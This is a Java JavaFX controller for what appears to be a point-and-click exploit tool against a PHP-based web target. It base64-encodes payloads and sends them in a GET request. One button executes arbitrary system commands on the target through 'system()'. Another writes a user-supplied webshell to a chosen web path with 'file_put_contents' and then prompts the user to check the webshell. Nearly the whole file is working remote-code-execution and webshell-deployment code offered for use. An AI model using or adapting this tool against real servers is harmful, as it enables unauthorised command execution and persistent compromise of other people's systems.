package sample;

import java.awt.*;
import java.net.URI;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import sun.misc.BASE64Encoder;

import java.net.Proxy;

public class Controller {

    @FXML
    public TextArea Info_Tb,Shell_Tb,Output_Tb;
    public TextField Target_Tb,Cmd_Tb,Wpath_Tb,Name_Tb;
    public String Target,Cmd,Payload,WebPath,Name,ShellContext;
    //public Proxy proxy;



    @FXML
    private void Exp_btnAction(ActionEvent event) throws Exception {
        Request request =new Request();
        Target = Target_Tb.getText().trim();
        Cmd = Cmd_Tb.getText().trim();
        Payload = "system('%s');";
        //proxy = request.setProxy("127.0.0.1",8080);
        if (Target.isEmpty() || Cmd.isEmpty()){
            Alert error = new Alert(Alert.AlertType.ERROR,"参数格式不合规,请检查后重试！");
            error.setHeaderText("参数不合规");
            error.show();
        }
        else {
            Cmd = encryptBASE64(String.format(Payload,Cmd)).replace("\r\n", "");
            Info_Tb.setText(request.sendGet(Target,"", null, Cmd));
        }
    }

    @FXML
    private  void F_btnAction(ActionEvent event) throws Exception{
        Request request =new Request();
        Output_Tb.setText("");
        Target = Target_Tb.getText().trim();
        WebPath = Wpath_Tb.getText().trim();
        Name = Name_Tb.getText().trim();
        ShellContext = Shell_Tb.getText().trim();
        Payload = "file_put_contents(\"%s\", hex2bin(\"%s\"), LOCK_EX);";
        //proxy = request.setProxy("127.0.0.1",8080);
        if (Target.isEmpty() || WebPath.isEmpty() || Name.isEmpty() || ShellContext.isEmpty()){
            Alert error = new Alert(Alert.AlertType.ERROR,"参数格式不合规,请检查后重试！");
            error.setHeaderText("参数不合规");
            error.show();
        }
        else {
            Payload = String.format(Payload,WebPath+Name,Convert.Str2Hex(ShellContext));
            Cmd = encryptBASE64(Payload).replace("\r\n", "");
            if ((request.sendGet(Target,"", null, Cmd)).length() == 0){
                Output_Tb.setText("Success done, Please check your webshell !");
            }
            else {
                Output_Tb.setText(request.sendGet(Target, "", null, Cmd));
            }

        }
    }


    @FXML
    public void OpenAction(ActionEvent event) throws Exception{
        Desktop.getDesktop().browse(new URI("http://www.saferoad.cc/archives/341"));
        }

    /**
     * BASE64加密
     *
     * @param key
     * @return
     * @throws Exception
     */
    public static String encryptBASE64(String key) {
        byte[] bt = key.getBytes();
        return (new BASE64Encoder()).encodeBuffer(bt);
    }
}
